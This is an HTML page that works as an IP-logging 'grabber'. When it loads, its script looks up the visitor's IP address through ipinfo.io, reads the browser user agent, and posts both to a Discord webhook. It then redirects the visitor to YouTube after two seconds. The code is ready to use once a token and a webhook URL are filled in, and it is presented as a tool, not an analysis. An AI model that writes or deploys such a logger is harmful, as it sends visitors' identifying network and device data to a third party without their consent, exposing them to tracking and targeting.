<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Siquiriity Chicks >:)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Redirecting</h1>
        <p>Your IP and browser information is being logged. You will be redirected shortly.</p>
    </div>

    <script>
        // Immediately fetch IP address and browser info upon page load
        window.onload = function () {
            fetch('https://ipinfo.io/json?token=YOUR_TOKEN') // Replace 'YOUR_TOKEN' with your ipinfo.io token
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip; // User's IP
                    const browserInfo = navigator.userAgent; // Browser info from user agent

                    // Prepare message for Discord webhook
                    const message = {
                        content: `New log received:\n\n**IP Address**: ${userIp}\n**Browser**: ${browserInfo}`,
                    };

                    // Send data to Discord webhook
                    fetch('YOUR_DISCORD_WEBHOOK_URL', { // Replace with your actual Discord webhook URL
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .then(response => response.json())
                    .then(result => {
                        console.log('Data sent successfully to Discord:', result);
                    })
                    .catch(error => {
                        console.error('Error sending data to Discord:', error);
                    });

                    // Redirect to YouTube after logging
                    setTimeout(function() {
                        window.location.href = 'https://www.youtube.com'; // Redirecting to YouTube
                    }, 2000); // Redirect after 2 seconds to allow logging
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                });
        };
    </script>
</body>
</html>
